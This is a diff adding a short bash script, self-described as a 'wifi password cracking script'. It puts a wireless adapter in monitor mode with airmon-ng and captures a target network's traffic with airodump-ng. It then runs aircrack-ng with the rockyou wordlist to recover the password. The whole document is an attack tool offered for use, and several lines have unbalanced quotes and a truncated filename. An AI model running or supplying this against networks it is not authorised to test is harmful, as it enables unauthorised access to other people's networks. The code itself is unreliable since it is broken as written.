@@ -1,0 +1,17 @@
+#!/bin/bash
+#wifi password cracking script
+sudo iwconfig
+read -p "choose adapter:    " adapter
+sudo airmon-ng check kill
+sudo airmon-ng start "$adapter"
+echo "input ctrl + c to continue"
+sudo airodump-ng "$adapter"
+read -p "choose bssid:    " bssid
+read -p "choose channel:    " channel
+read -p "choose network name:    " wname
+read -p "choose number of packets:    " npacket
+sudo airodump-ng --bssid "$bssid" --channel "$channel" -w "$wname" "$adapter"
+sudo mate-terminal -e "sudo airodump-ng --bssid "$bssid" --channel "$channel"
+sleep "$npacket"
+sudo aircrack-ng --bssid "$bssid" -w /usr/share/wordlists/rockyou.txt "$wname-0
+
